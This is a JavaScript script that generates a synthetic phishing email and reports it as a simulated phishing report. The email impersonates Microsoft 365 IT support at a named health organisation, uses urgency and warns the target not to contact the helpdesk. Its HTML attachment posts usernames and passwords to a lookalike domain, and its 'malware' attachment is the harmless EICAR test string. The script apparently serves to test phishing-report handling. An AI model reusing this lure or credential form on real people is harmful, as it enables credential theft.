const EICAR = String.raw`X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`;

const htmlBody = `<html><body>
<p>Dear Colleague,</p>
<p>Our records show your <b>Microsoft 365</b> password expires in <b>4 hours</b>. To keep access to
email and shared drives you must re-validate your credentials immediately using the secure portal below.</p>
<p><a href="http://malware.wicar.org/data/eicar.com">Re-validate my account now</a></p>
<p>If the button does not work, copy this link: https://login-microsoftonline-verify.account-sec-review.com/auth?u=ap.rivera%40bannerhealth.com</p>
<p>The attached remittance advice and the mandatory security form must be completed today. Failure to act
will result in permanent suspension of your mailbox, and IT will not be able to restore it.</p>
<p>Do not forward this message to the helpdesk &mdash; this verification is handled by our external
compliance partner only.</p>
<p>Regards,<br>Michael Grant<br>IT Service Desk &amp; Account Compliance</p>
</body></html>`;

const textBody = htmlBody
  .replace(/<[^>]+>/g, "")
  .replace(/&mdash;/g, "-")
  .replace(/&amp;/g, "&")
  .replace(/\n{3,}/g, "\n\n")
  .trim();

const boundary = "----=_Part_9182_phishsim";

const raw = [
  "Return-Path: <bounce@account-sec-review.com>",
  "Received: from mail.corp-relay.example (unknown [45.155.205.233])",
  "\tby mx01.bannerhealth.com (Postfix) with ESMTPS id 4B9C2A1F3D",
  "\tfor <ap.rivera@bannerhealth.com>; Tue, 11 Mar 2025 08:14:22 -0700 (MST)",
  "Received: from localhost (unknown [193.32.162.189])",
  "\tby mail.corp-relay.example with SMTP id 0f2ac9e1;",
  "\tTue, 11 Mar 2025 15:14:09 +0000 (UTC)",
  "Authentication-Results: mx01.bannerhealth.com;",
  "\tspf=fail (sender IP is 45.155.205.233) smtp.mailfrom=account-sec-review.com;",
  "\tdkim=none; dmarc=fail action=quarantine header.from=bannerhealth.com",
  "From: \"IT Service Desk\" <it-servicedesk@account-sec-review.com>",
  "Reply-To: <recovery.desk@mailfence-secure.net>",
  "To: ap.rivera@bannerhealth.com",
  "Subject: ACTION REQUIRED: Your Microsoft 365 password expires in 4 hours",
  "Date: Tue, 11 Mar 2025 15:14:07 +0000",
  "Message-ID: <0f2ac9e1-7d31-4a20-9c4e-af31b2c98110@account-sec-review.com>",
  "X-Originating-IP: [102.129.145.7]",
  "X-Mailer: PHPMailer 6.1.6",
  "MIME-Version: 1.0",
  `Content-Type: multipart/mixed; boundary="${boundary}"`,
  "",
  `--${boundary}`,
  "Content-Type: text/plain; charset=UTF-8",
  "Content-Transfer-Encoding: 7bit",
  "",
  textBody,
  "",
  `--${boundary}`,
  "Content-Type: text/html; charset=UTF-8",
  "Content-Transfer-Encoding: 7bit",
  "",
  htmlBody,
  "",
  `--${boundary}`,
  "Content-Type: application/octet-stream; name=\"Remittance_Advice_8841.doc\"",
  "Content-Transfer-Encoding: base64",
  "Content-Disposition: attachment; filename=\"Remittance_Advice_8841.doc\"",
  "",
  Buffer.from(EICAR).toString("base64"),
  "",
  `--${boundary}`,
  "Content-Type: text/html; name=\"Account_Verification_Form.html\"",
  "Content-Transfer-Encoding: base64",
  "Content-Disposition: attachment; filename=\"Account_Verification_Form.html\"",
  "",
  Buffer.from(
    '<html><body><form action="https://login-microsoftonline-verify.account-sec-review.com/collect" method="post">' +
      '<input name="user"><input name="pass" type="password"><button>Verify</button></form></body></html>',
  ).toString("base64"),
  "",
  `--${boundary}--`,
  "",
].join("\r\n");

const report = {
  simulation: true,
  reported_at: new Date().toISOString(),
  report_inbox: "reportphishing@bannerhealth.com",
  reported_by: "ap.rivera@bannerhealth.com",
  raw_email: raw,
};

console.error(`Generated synthetic report (${raw.length} bytes of RFC 822)`);
console.log(JSON.stringify(report));
